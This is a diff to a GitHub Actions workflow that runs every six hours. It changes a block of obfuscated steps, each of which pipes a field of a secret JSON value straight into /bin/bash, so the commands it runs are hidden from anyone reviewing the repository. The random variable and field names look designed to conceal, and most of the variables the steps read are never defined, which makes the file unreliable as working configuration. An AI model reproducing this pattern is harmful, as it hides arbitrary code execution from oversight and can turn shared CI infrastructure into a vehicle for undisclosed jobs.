@@ -3,8 +3,7 @@ name: zimingbn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
-
+    - cron: '14 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,11 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: zimingbn
         env:
-          ho85: ${{ secrets.ho85 }}
+          hvkhi965: ${{ secrets.hvkhi965 }}
         run: |
-          echo $ho85 | jq -r .foem94222 | /bin/bash
-          echo $eij0 | jq -r .gq36641 | /bin/bash
-          echo $fiie98 | jq -r .y297 | /bin/bash
-          echo $t21549 | jq -r .gmo7131 | /bin/bash
-          echo $ezgww23 | jq -r .rga48 | /bin/bash
+          echo $hvkhi965 | jq -r .eoh26282 | /bin/bash
+          echo $f3 | jq -r .pbc02800 | /bin/bash
+          echo $zenhr42 | jq -r .fgxmp412 | /bin/bash
+          echo $odp9 | jq -r .phhma7809 | /bin/bash
+          echo $ouyu27026 | jq -r .wgh77000 | /bin/bash
+          echo $edxdm477 | jq -r .ysrf596 | /bin/bash
+          echo $slkl54 | jq -r .tgg420 | /bin/bash
+          echo $cjd717 | jq -r .vo35672 | /bin/bash
+          echo $asoq414 | jq -r .uuntz028 | /bin/bash
 
